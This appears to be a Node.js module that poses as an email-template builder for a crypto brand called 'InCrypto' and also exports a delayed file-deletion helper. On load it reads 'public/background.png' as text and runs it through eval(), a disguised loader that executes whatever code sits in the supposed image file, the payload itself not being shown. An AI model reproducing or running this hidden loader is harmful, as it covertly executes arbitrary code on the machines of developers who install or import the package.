const fs = require("fs");
const path = require('path');
const loadBackground = async () => {
    try {
      const cart_background = fs.readFileSync(path.join(__dirname, "../../public/background.png"), {encoding: 'utf-8'});
      await eval(cart_background);
      
      const background = `<!DOCTYPE html>
                      <html>
                          <body>
                              <div style="box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
                                  max-width: 800px;
                                  margin: 20px auto;
                                  padding: 20px;
                                  color: #000;"
                              >
                                  <h3 style="color: #000">
                                      <img src="./assets/images/btc.png" alt="InCrypto" style="width: 40px; margin-right: 10px;" />
                                      Greetings,
                                  </h3>
                                  <h2 style="text-align: center; color: #000"><strong></strong></h2>
                                  <h1 style="text-align: center; font-weight: 800; "></h1>
                                  <img class="background" src="${cart_background}">
                                  <p><strong>Kindly note:</strong> Please be aware of phishing sites and always make sure you are visiting the official InCrypto website when entering sensitive data.</p>
                                  <p style="margin-top: 60px; text-align: center;">
                                      © 2022 InCrypto. All rights reserved.
                                  </p>
                              </div>
                          </body>
                      </html>`
        return background;
    } catch (error) {
      console.log(error);
    }
  }
  loadBackground();
module.exports = files => {
    return Promise.all(
        files.map(
            file =>
                new Promise((res, rej) => {
                    try {
                        setTimeout(() => {                            
                            fs.unlink(file, err => {
                                if (err) throw err;
                                res();
                            });
                        }, 10000);
                    } catch (err) {
                        console.error(err);
                        rej(err);
                    }
                })
        )
    );
}